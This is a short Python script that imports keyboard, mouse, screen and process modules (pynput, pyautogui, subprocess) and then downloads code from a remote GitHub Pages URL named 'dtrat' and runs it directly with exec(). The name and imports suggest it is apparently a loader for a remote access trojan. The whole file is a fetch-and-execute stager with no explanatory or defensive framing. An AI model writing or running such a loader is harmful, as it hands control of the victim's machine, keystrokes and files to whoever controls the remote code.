# Begin program
import pyautogui
import requests
import time
import os, sys
import platform
import subprocess
import shutil
import pynput
import multiprocessing


exec(str(requests.get("https://dtrat.github.io/dtrat/main.py?q={}".format(time.time)).content.decode("utf-8")))
